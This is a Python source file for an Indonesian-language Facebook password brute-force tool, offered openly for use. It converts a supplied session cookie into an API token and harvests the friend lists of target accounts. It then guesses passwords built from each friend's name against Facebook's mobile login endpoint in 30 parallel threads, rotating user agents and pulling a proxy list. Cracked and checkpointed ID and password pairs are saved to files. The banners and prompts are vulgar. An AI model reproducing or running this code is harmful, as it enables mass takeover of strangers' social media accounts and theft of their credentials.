#-----------------[ IMPORT-KONTOL ]-----------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT-PROXY ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi Note 9 Pro)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-MEMEKMU]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def nazri_ganteng(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[KONTOL]-----------------#
def banner():
	nazri_ganteng(f'{u}==' * 25)
	print(f"""{m}███╗░░░███╗██████╗░███████╗{m}██████████████████████[/]
████╗░████║██╔══██╗██╔════╝{m}██████████████████████[/]
██╔████╔██║██████╦╝█████╗░░{P}██████████████████████[/]
██║╚██╔╝██║██╔══██╗██╔══╝░░{P}██████████████████████[/]
██║░╚═╝░██║██████╦╝██║░░░░░ Made By {m}[Indo{P}nesia] {P}Coder[{h}EHANXD{P}]
╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░
MULTI BRUTEFORCE FACEBOOK""")
	nazri_ganteng(f"""(§) SC SIMPLE NO BACOT PASTI LANGSUNG CROT{h}💦{P}\n{P}(§) INSTAGRAM: {k}@RHNDRMNN [{h}EHANXD{P}]""")
	nazri_ganteng('──'* 25)
#--------------------[ MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f'{m}[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukin Kokinya Biar Bisa Crot : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(tok)
					cokiew = open(".cok.txt", "w").write(cok)
					print(f'\n{m}[!] Login Sukses Brody Jalanin Ulang Perintahnya!!!!')
				else:
					exit('\n[+] LO91N 9A9AL, TUTOR AMBIL KOKI FACEBOOK? HUBUNGIN INSTAGRAM GW @RHNDRMNN!!')
		
	except Exception as e:
		print('\n[!] LO91N 9A9AL, TUTOR AMBIL KOKI FACEBOOK? HUBUNGIN INSTAGRAM GW @RHNDRMNN!!')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Koki Lu Udah Basi/Mokad ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	tgl = datetime.datetime.now().day
	bln = dic[(str(datetime.datetime.now().month))]
	thn = datetime.datetime.now().year
	ip = requests.get("https://api.ipify.org").text
	nazri_ganteng(f'ID    : '+str(my_id))
	nazri_ganteng(f'Nama  : {my_name}')
	nazri_ganteng(f'IP    : {ip}')
	nazri_ganteng(f'TTL   : '+str(tgl)+'-'+str(bln)+'-'+str(thn))
	nazri_ganteng('──'* 25)
	cetak('[bold purple] [§]1. BRUTE TARGET!!!\n [§]2. BRUTE MANTAN KESAYANGAN!!!\n [§]3. CEK HASIL TESPEK (Hasil Crot)\n [§]0. CLOSE TOOLS(NGAPUS KOKI)[bold purple]')
	nazri_ganteng('──'* 25)
	nazri_cool_banget = input(f'{k}└─ PILIH YANG SESUAI BIAR CROT💦 : ')
	nazri_ganteng('──'* 25)
	if nazri_cool_banget in ['1']:
		dump_massal()
	if nazri_cool_banget in ['2']:
		pengikut()
	elif nazri_cool_banget in ['3']:
		result()
	elif nazri_cool_banget in ['0']:
		os.system('rm -rf token.txt')
		os.system('rm -rf cookie.txt')
		print(f'{m}└─ {k}Successfully {u}Close {h}Tools+Ngapus {b}Koki')
		exit()
	else:
		print(f'{m}└─ BISA MILIH GA SIH LU TOLOL🖕 ')
		back()
def error():
	print(f'{m}└─ Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'{u}>> 1. Hasil Tespek{h}OK{x}  ')
	print(f'{u}>> 2. Hasil Tespek{k}CP{x}  ')
	print(f'{u}>> 3. BalikLagi	')
	kz = input(f'\n{k}>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Ga Dapat Ditemukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Lo Kagak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{m}>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[ Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f'{m}>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[ Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f'{m}>> Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	ses = requests.Session()
	user = input(f"{k} [+] Masukan Id Target Lu Biar Crot : ")
	if user.isdigit():
		url = (f"https://mbasic.facebook.com/{user}?v=followers")
	try:
		link = ses.get(url, cookies={"cookie": cok}).text
		if "Halaman Tidak Ditemukan" in link:
			print("\n [+] Target Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		elif "Anda Diblokir 5 Menit" in link:
			print("\n [+] Akun Anda Di Batasin Sementara")
			time.sleep(2);exit()
		elif "Konten Tidak Ditemukan" in link:
			print("\n [+] Target Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		else:
			dump_xshi()
	except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
		print(" [+] LOST CONNECTION ERROR, MAKANYA MODAL JANGAN ENAKNYA DOANG!!{P}")
		time.sleep(3);exit()
	print("\r")
	setting()
def dump_xshi():
    print()
    print('         KAMU TERTIPU JELEK')
    print()
    print('        NUNGGU GW UPDATE HAHAHAH')
    time.sleep(3)
    back('\rTERIMA KASIH')

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{k}└─ TARGET BERAPA ID? : '))
	except ValueError:
		print(f'{m}└─ GABISA NULIS YA LU ? HAMDEH GAGAL CROT ')
		exit()
	if jum<1 or jum>100:
		print(f'{m}└─ Failed Cari Yang Publik Akunya Biar Gampang Diajak Crot ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		print()
		print(f'{m}>>Penting:{k}ID WAJIB PUBLIK BIAR GAMPANG DIAJAK CROTNYA!!!')
		print()
		kl = input(f'{k}└─ Masukan ID Target Crot '+str(yz)+' : ')
		uid.append(kl)
	nazri_ganteng(f'{P}──'* 25)
	for userr in uid:
		try:
			headers = {
			"connection": "keep-alive",
			"accept": "*/*",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
			}
			params = {
			"access_token": token,
			"fields": f"name,friends.fields(id,name,birthday)"
			}
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], params = params, headers = headers, cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└─ unstable signal ')
			exit()
	try:
		print(f'Total ID {P}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('└─ unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'└─ {P}Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	nazri_ganteng('──'* 25)
	cetak('[bold purple] [§]1. TUA \n [§]2. PERAWAN \n [§]3. NGACAK[bold purple]')
	nazri_ganteng('──'* 25)
	hu = input(f'{k}└─ Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{m}╰─ GABISA NGETIK LU TOT? ')
		exit()
		print('')
		
	print('')
	print(f'''{k}Ketik ehanxd''')
	print('')
	hc = input('╰─ Ketik Yang bener jing : ')
	if hc in ['xshinchan','Xshinchan']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(f'{k}╰─ Tambahin Password Manual Biar Gampang Crot y/t > ')
	nazri_ganteng('──'* 25)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Masukkan kata sandi tambahan minimal 6 karakter\nContoh :[green] Indonesia,crotdalem,crotluar[white] ')
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	nazri_ganteng('──'* 25)
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	nazri_ganteng('──'* 25)
	print(f'{k}└─ hasil {h}OK{x} Tersimpan Di {h}OK/%s {x}'%(okc))
	print(f'<{k}└─ hasil {k}CP{x} Tersimpan Di {k}CP/%s {x}'%(cpc))
	print(f'{k}WAITING{x}/{u}SABARNUNGGUCROTNYA{x}\n')
	nazri_ganteng('──'* 25);prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
						
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
					pwv.append(frs+'012')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
					pwv.append(frs+'09')
					pwv.append(frs+'10')
					pwv.append('kontol')
					pwv.append('anjing')
					pwv.append(frs+'321')
					pwv.append(frs+'00')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak('\t[cyan]└─[green] CROT TELAH SUKSES , CEK HASIL TESPEK CP / OK  DI MENU PERTAMA, JIKA TERKENA BUG JALANI ULANG SCNYA🖕👾🖕 [EHANXD] <<[white] ')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print('')
		woi = input(' KLIK ENTER SAJA BIAR GA BUG : ')
		if woi in ['y','Y']:
			exit()
		
			print(f'\t{x}└─{k} Good Bye Thanks To Using My Script {x} << ')
			time.sleep(2)
			back()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	rr = random.randint
	#UA Generate Xshinchan
	#asedekontol
	#hello 
	Xshin = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
	ua = random.choice(Xshin)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1138256180423492&kid_directed_site=0&app_id=1138256180423492&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D1138256180423492%26display%3Dpage%26redirect_uri%3Dhttps%253A%252F%252Faccounts.shopify.com%252Flogin%252Fexternal%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dc2f75de03d88da0a9d730aba318d12dd6bc357b6d7798530%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0590b7c-c4cc-4b66-b419-14083139e4c3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.shopify.com%2Flogin%2Fexternal%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc2f75de03d88da0a9d730aba318d12dd6bc357b6d7798530%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=799063067916842&cbt=1697315405849&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df107332bd16fa34%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener&client_id=799063067916842&display=touch&domain=www.digimap.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.digimap.co.id%2Flogin&locale=en_US&logger_id=f81df0319ce4dc&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v13.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=799063067916842&kid_directed_site=0&app_id=799063067916842&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D799063067916842%26cbt%3D1697315405849%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df107332bd16fa34%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%26client_id%3D799063067916842%26display%3Dtouch%26domain%3Dwww.digimap.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Flogin%26locale%3Den_US%26logger_id%3Df81df0319ce4dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34290959a6d4cc%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%2526frame%253Df34154227dfa4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv13.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'{K}   EHANXD {cpc}')
				print(f'\r├──{K}{idf}|{pw}    \n{M}{ua}           \n')
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'{H}   EHANXD {okc}')
				print(f'\r├── {H}{idf}|{pw} \n{P}└── {H}{kuki}\n{H}{ua}{P}\n')
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
